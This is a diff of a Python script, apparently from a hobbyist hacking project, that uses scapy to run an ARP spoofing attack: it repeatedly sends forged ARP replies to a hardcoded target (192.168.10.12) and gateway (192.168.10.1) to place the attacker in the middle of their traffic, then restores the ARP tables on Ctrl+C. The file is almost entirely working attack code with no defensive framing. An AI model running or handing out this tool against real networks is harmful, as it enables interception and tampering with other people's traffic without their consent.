@@ -1,37 +1,47 @@
-#!usr/bin/evn python
+import scapy.all as scapy 
+import time, optparse,sys
 
-import time
-import scapy.all as scapy
-
+# Get the Mac Address of a specific IP.
 def get_mac(ip):
-    arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast/arp_request
-    result = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
-    return result[0][1].hwscr
+    arp_request_broadcast = scapy.Ether(dst=scapy.ETHER_BROADCAST) / scapy.ARP(pdst=ip)
+    ans, unans = scapy.srp(arp_request_broadcast, timeout=2, iface="wlan0", inter=0.1, verbose=0)
+    for snd, rcv in ans:
+        return rcv.sprintf(r"%Ether.src%")
 
+# This will send the arp Packets
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     arp_packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
     scapy.send(arp_packet,verbose=False)
 
-def restore(des_ip,src_ip):
-    des_mac = get_mac(des_ip)
+# This will resote the IP tabels entires. sanding a good request.
+def restore(dst_ip,src_ip):
+    dst_mac = get_mac(dst_ip)
     src_mac = get_mac(src_ip)
-    packet = scapy.ARP(op=2,pdst=des_ip,hwdst=des_mac, psrc=src_ip,hwsrc=src_mac)
-    scapy.send(packet,count=4,verbose=False) # Sending the restore request to the targer 4 times.
+    '''' op=2 for responce.       IP destination & Hardware mac address, IP source & hardware mac address  '''''
+    restore_packet = scapy.ARP(op=2,pdst=dst_ip,hwdst=dst_mac,psrc=src_ip,hwsrc=src_mac)
+    scapy.send(restore_packet, count=4,verbose=False)
 
-target_ip = "<Target ip>"
-geteway_ip = "<Geteway ip>"
+
+target_ip = "192.168.10.12" 
+geteway_ip = "192.168.10.1"
+
+mac = get_mac(target_ip)
+print(mac)
+
+
 try:
-    packet_count = 0
+    count = 0
     while True:
-        spoof(target_ip,geteway_ip) # Send ARP request to the Targer, (I am the Router)
-        spoof(geteway_ip,target_ip) # Send ARP request to the Router, (I am the Target)
-        packet_count += 2
-        print(f"\r[+] Packet sent {packet_count}",end="") # The \r will overwrite the print() again and again
-        time.sleep(2)
+        spoof(target_ip,geteway_ip)
+        spoof(geteway_ip, target_ip)
+        count += 2
+        print(f"\r[+] Packets Send # {count}",end="")
+        sys.stdout.flush()
+        time.sleep(1)
 except KeyboardInterrupt:
-    print("\n[+] Detected Clt + C .... Reseting ARP Tables.\n Please Waite.")
-    restore(target_ip,geteway_ip)
-    restore(geteway_ip,target_ip)
+    print("\n[+] Detected Clt + C .... Reseting ARP Tables. Please Waite....")
+    restore(target_ip, geteway_ip)
+    restore(geteway_ip, target_ip)
+
+
